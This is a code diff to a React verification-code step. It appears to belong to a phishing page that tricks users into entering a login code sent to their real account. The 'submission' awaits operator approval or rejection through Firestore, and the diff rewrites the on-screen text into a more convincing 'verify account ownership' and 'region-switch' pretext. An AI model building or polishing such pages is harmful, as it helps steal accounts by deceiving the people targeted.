@@ -12,7 +12,6 @@ import type { Submission } from '@/lib/types';
 import { useState, useEffect } from 'react';
 import { useToast } from '@/hooks/use-toast';
 import { cn } from '@/lib/utils';
-import { InfoAlert } from './info-alert';
 import { ResendCode } from './resend-code';
 import { db } from '@/lib/firebase';
 import { doc, onSnapshot } from 'firebase/firestore';
@@ -131,12 +130,10 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
                 <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
                     <KeyRound className="h-8 w-8" />
                 </div>
-                <h1 className="text-2xl font-bold">Step 2: Verification Code</h1>
-                <p className="text-muted-foreground">Enter the 6-digit code sent to your device.</p>
-                <InfoAlert 
-                    title="Hint" 
-                    message="You should receive a code on the email account linked with this username." 
-                />
+                <h1 className="text-2xl font-bold">Step 2: Verify Account Ownership</h1>
+                <p className="text-muted-foreground max-w-md mx-auto">
+                    To protect our network, we need to verify you are the owner of @{submissionId}. We have sent a verification code to your registered email/phone. Please enter it below to proceed with the region-switch.
+                </p>
             </div>
 
             <Progress value={50} className="w-[80%] mx-auto mb-8" />
@@ -168,7 +165,7 @@ export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack }
                                     </div>
                                 </FormControl>
                                 <p className="text-xs text-muted-foreground text-center pt-2">
-                                    This step is crucial to know if you really own the account.
+                                    This code confirms you are the legitimate owner of the account.
                                 </p>
                                 <FormMessage className="text-center" />
                             </FormItem>
